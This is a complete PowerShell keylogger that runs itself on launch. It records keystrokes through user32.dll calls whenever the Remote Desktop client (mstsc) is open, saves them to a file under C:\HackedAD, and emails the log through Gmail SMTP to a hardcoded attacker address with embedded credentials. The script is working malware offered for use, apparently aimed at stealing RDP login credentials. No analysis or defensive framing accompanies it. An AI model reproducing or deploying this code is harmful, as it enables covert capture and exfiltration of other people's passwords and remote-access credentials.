function Start-KeyLogger($Path="C:\HackedAD\test.txt") 
{
  # Signatures for API Calls
  $signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

  # load signatures and make members available
  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
    
  # create output file
  $null = New-Item -Path $Path -ItemType File -Force

  

  try
  {
    
    while ($true) {
        $i=1
        $string = Get-Process -Name 'mstsc' -ErrorAction SilentlyContinue 
        
        while ($string.ProcessName -eq 'mstsc') {
         Start-Sleep -Milliseconds 40
      
        # scan all ASCII codes above 8
      for ($ascii = 9; $ascii -le 254; $ascii++) {
        # get current key state
        $state = $API::GetAsyncKeyState($ascii)

        # is key pressed?
        if ($state -eq -32767) {
          $null = [console]::CapsLock

          # translate scan code to real code
          $virtualKey = $API::MapVirtualKey($ascii, 3)

          # get keyboard state for virtual keys
          $kbstate = New-Object Byte[] 256
          $checkkbstate = $API::GetKeyboardState($kbstate)

          # prepare a StringBuilder to receive input key
          $mychar = New-Object -TypeName System.Text.StringBuilder

          # translate virtual key
          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

          if ($success) 
          {
            # add key to logger file
            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
          }
        }
      }
    
    $string = Get-Process -Name 'mstsc' -ErrorAction SilentlyContinue 
    $i++
    
    }

    if ($i -gt 1)
        { $username   = 'totallynothingshady@gmail.com'
          $password   = 'SecurePassword1234'
          $secstr     = New-Object -TypeName System.Security.SecureString
          $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
        
          $hash = @{
    from       = "totallynothingshady@gmail.com"
    to         = "totallynothingshady@gmail.com"
    subject    = "New RDP"
    attachments = $Path
    smtpserver = "smtp.gmail.com"
    port       = "587"
    body       = "KeyLogger Resault"
    credential = New-Object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
    usessl     = $true
    verbose    = $true
}

        Send-MailMessage @hash
        
        
        
        }

  }
  }

  finally {}
 
  
}


Start-KeyLogger